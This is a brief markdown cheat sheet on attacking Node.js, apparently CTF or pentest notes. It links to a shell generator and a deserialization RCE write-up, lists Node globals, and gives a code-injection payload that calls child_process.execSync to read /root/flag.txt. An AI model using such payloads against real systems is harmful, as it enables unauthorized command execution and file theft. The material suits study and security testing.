# NodeJS

[READ](https://github.com/ajinabraham/Node.Js-Security-Course)

## Shell
[Shell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

## Deserialization

[desserialization](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

## Globals
```javascript
__dirname
__filename
exports
module
require()
```

## Node.js Payload
```javascript
"return process.mainModule.require('child_process').execSync('cat
/root/flag.txt');"
```